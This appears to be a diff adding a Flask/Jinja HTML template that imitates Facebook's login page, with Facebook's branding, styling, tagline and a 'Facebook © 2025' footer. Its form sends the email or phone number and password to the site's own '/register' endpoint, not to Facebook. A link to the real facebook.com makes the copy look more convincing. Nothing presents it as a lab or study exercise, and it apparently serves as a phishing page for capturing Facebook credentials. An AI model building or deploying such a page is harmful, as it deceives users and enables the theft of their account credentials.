@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Login</title>
+    <link
+      rel="icon"
+      type="image/png"
+      href="{{ url_for('static', filename='logo.png') }}"
+    />
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, Arial, sans-serif;
+      }
+
+      body {
+        background-color: #f0f2f5;
+        display: flex;
+        flex-direction: column;
+        min-height: 100vh;
+      }
+
+      .container {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        flex-wrap: wrap;
+        gap: 80px;
+        padding: 20px;
+        flex: 1;
+      }
+
+      /* === LEFT SECTION === */
+      .left-section {
+        flex: 1 1 350px;
+        max-width: 420px;
+        text-align: left;
+      }
+
+      .left-section h1 {
+        color: #1877f2;
+        font-size: 56px;
+        margin-bottom: 10px;
+      }
+
+      .left-section p {
+        font-size: 20px;
+        color: #1c1e21;
+        line-height: 1.5;
+      }
+
+      /* === RIGHT SECTION === */
+      .login-box {
+        background: #fff;
+        padding: 30px 20px 30px;
+        border-radius: 8px;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+        width: 380px;
+        max-width: 100%;
+        text-align: center;
+        flex-shrink: 0;
+      }
+
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        padding: 14px;
+        margin: 10px 0;
+        border: 1px solid #dddfe2;
+        border-radius: 6px;
+        font-size: 16px;
+        outline: none;
+      }
+
+      input:focus {
+        border-color: #1877f2;
+        box-shadow: 0 0 2px #1877f2;
+      }
+
+      button {
+        width: 100%;
+        background-color: #1877f2;
+        color: #fff;
+        font-weight: bold;
+        border: none;
+        padding: 14px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 18px;
+        margin-top: 10px;
+        transition: background-color 0.3s ease;
+      }
+
+      button:hover {
+        background-color: #166fe5;
+      }
+
+      .forgot-link {
+        display: block;
+        color: #1877f2;
+        font-size: 14px;
+        margin: 15px 0;
+        text-decoration: none;
+      }
+
+      .forgot-link:hover {
+        text-decoration: underline;
+      }
+
+      .divider {
+        border-top: 1px solid #dddfe2;
+        margin: 15px 0;
+      }
+
+      .create-btn {
+        display: block;
+        width: 100%;
+        background-color: #42b72a;
+        color: #fff;
+        font-weight: bold;
+        border: none;
+        padding: 14px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 16px;
+        text-decoration: none;
+        text-align: center;
+        transition: background-color 0.3s ease;
+      }
+
+      .create-btn:hover {
+        background-color: #36a420;
+      }
+
+      .footer {
+        text-align: center;
+        padding: 20px;
+        font-size: 12px;
+        color: #606770;
+      }
+
+      /* === RESPONSIVE DESIGN === */
+      @media (max-width: 900px) {
+        .container {
+          flex-direction: column;
+          text-align: center;
+          gap: 30px;
+        }
+
+        .left-section {
+          text-align: center;
+        }
+
+        .left-section h1 {
+          font-size: 48px;
+        }
+
+        .left-section p {
+          font-size: 18px;
+        }
+
+        .login-box {
+          width: 100%;
+          max-width: 400px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .left-section h1 {
+          font-size: 40px;
+        }
+
+        .left-section p {
+          font-size: 16px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+          font-size: 14px;
+          padding: 12px;
+        }
+
+        button,
+        .create-btn {
+          font-size: 15px;
+          padding: 12px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <!-- Left side -->
+      <div class="left-section">
+        <h1>facebook</h1>
+        <p>Connect with friends and the world around you on Facebook.</p>
+      </div>
+
+      <!-- Right side -->
+      {% if message %}
+      <p id="warning" style="color: red; margin-top: 10px">{{ message }}</p>
+      {% endif %}
+      <div class="login-box">
+        <form method="POST" action="/register">
+          <input
+            type="text"
+            name="username"
+            placeholder="Email or phone number"
+            required
+          />
+          <input
+            type="password"
+            name="password"
+            placeholder="Password"
+            required
+          />
+          <button onclick="warning()" type="submit">Log In</button>
+        </form>
+
+        <a href="#" class="forgot-link">Forgotten password?</a>
+
+        <div class="divider"></div>
+        <a href="https://www.facebook.com/" class="create-btn"
+          >Create New Account</a
+        >
+      </div>
+    </div>
+
+    <div class="footer">
+      <p>Facebook © 2025</p>
+    </div>
+
+    <script>
+      const warning1 = document.getElementById("warning");
+
+      function warning() {
+        if (warning1) {
+          setTimeout(() => {
+            warning1.style.display = "none";
+          }, 3000);
+        }
+      }
+    </script>
+  </body>
+</html>
